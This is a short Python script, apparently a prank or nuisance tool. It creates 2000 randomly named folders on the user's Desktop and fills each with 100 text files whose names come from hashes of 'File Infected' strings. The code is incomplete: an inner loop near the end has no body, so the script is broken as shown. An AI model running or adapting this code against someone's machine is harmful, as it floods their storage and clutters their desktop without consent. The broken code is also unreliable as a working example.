from ntpath import join
import os
import hashlib
from pystyle import *
from random import *
desktop = os.path.join(os.path.expanduser("~"), "Desktop")

YOUR_TXT = ""
YOUR_NAME_FOR_DIR = ""

for x in range(2000):
    myfoldername = hashlib.sha256((YOUR_NAME_FOR_DIR + str(randint(1,1000000))).encode()).hexdigest()
    efolder      = os.path.join(desktop, myfoldername)
    os.mkdir(efolder)
    Write.Print(f"[Dir] --> {efolder}\n", Colors.green, interval=0)
    for f in range(100):
        myfilename = hashlib.sha256(("File Infected: " + str(randint(1,1000000))).encode()).hexdigest() + ".txt"
        with open(efolder + "\\" + myfilename, 'w') as file:
           file.write(YOUR_TXT)
           for w in range(100):
               


input()
